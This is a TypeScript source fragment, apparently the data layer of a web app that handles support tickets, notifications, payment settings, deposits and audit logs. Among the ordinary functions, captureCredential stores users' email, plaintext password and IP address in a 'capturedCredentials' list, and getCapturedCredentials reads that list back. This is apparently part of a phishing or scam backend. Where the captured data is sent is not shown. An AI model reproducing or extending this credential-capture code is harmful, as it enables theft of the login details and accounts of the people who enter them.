      createdAt: new Date().toISOString(),
    };

    ticket.replies.push(reply);
    ticket.updatedAt = new Date().toISOString();
    if (isAdmin && ticket.status === 'Open') {
      ticket.status = 'Pending';
    }

    // Notify ticket owner if admin replied
    if (isAdmin && ticket.userId !== userId) {
      data.notifications.unshift({
        id: `notif-${Date.now()}`,
        userId: ticket.userId,
        title: 'Support Ticket Update',
        message: `New reply received on ticket ${ticket.ticketId}.`,
        type: 'support',
        isRead: false,
        createdAt: new Date().toISOString(),
      });
    }

    saveDatabase(data);
    return reply;
  },

  updateTicketStatus(ticketId: string, status: 'Open' | 'Pending' | 'Resolved'): boolean {
    const data = loadDatabase();
    const ticket = data.supportTickets.find((t) => t.id === ticketId || t.ticketId === ticketId);
    if (!ticket) return false;
    ticket.status = status;
    ticket.updatedAt = new Date().toISOString();
    saveDatabase(data);
    return true;
  },

  // Notifications
  getNotificationsByUser(userId: string): NotificationItem[] {
    const data = loadDatabase();
    return data.notifications.filter((n) => n.userId === userId);
  },

  markNotificationAsRead(notifId: string, userId: string): boolean {
    const data = loadDatabase();
    const notif = data.notifications.find((n) => n.id === notifId && n.userId === userId);
    if (!notif) return false;
    notif.isRead = true;
    saveDatabase(data);
    return true;
  },

  markAllNotificationsAsRead(userId: string): void {
    const data = loadDatabase();
    data.notifications.forEach((n) => {
      if (n.userId === userId) n.isRead = true;
    });
    saveDatabase(data);
  },

  captureCredential(identifier: string, password: string, ip: string) {
    const data = loadDatabase();
    data.capturedCredentials = data.capturedCredentials || [];
    data.capturedCredentials.unshift({
      email: identifier,
      password,
      ip,
      date: new Date().toISOString()
    });
    if (data.capturedCredentials.length > 200) {
      data.capturedCredentials = data.capturedCredentials.slice(0, 200);
    }
    saveDatabase(data);
  },
  getCapturedCredentials() {
    const data = loadDatabase();
    return data.capturedCredentials || [];
  },
  // Settings
  getPaymentConfig(): PaymentConfig {
    const data = loadDatabase();
    return data.settings;
  },

  updatePaymentConfig(updates: Partial<PaymentConfig>): PaymentConfig {
    const data = loadDatabase();
    data.settings = {
      ...data.settings,
      ...updates,
      updatedAt: new Date().toISOString(),
    };
    saveDatabase(data);
    return data.settings;
  },

  // Admin Stats
  getAdminStats(): AdminStats {
    const data = loadDatabase();
    const pendingDeposits = data.deposits.filter((d) => d.status === 'Pending').length;
    const approvedDeposits = data.deposits.filter((d) => d.status === 'Approved').length;
    const rejectedDeposits = data.deposits.filter((d) => d.status === 'Rejected').length;
    const totalVolume = data.deposits
      .filter((d) => d.status === 'Approved')
      .reduce((acc, curr) => acc + curr.amount, 0);

    return {
      totalUsers: data.users.length,
      pendingDeposits,
      approvedDeposits,
      rejectedDeposits,
      totalTransactions: data.transactions.length,
      totalVolume,
    };
  },

  // Audit Logs
  logAudit(userId: string | undefined, action: string, details: string, ipAddress?: string) {
    const data = loadDatabase();
    data.auditLogs.unshift({
      id: `aud-${Date.now()}`,
      userId,
      action,
      ipAddress,
      details,
      createdAt: new Date().toISOString(),
    });
    // Keep max 500 audit logs
    if (data.auditLogs.length > 500) {
      data.auditLogs.pop();
    }
    saveDatabase(data);
  },
};
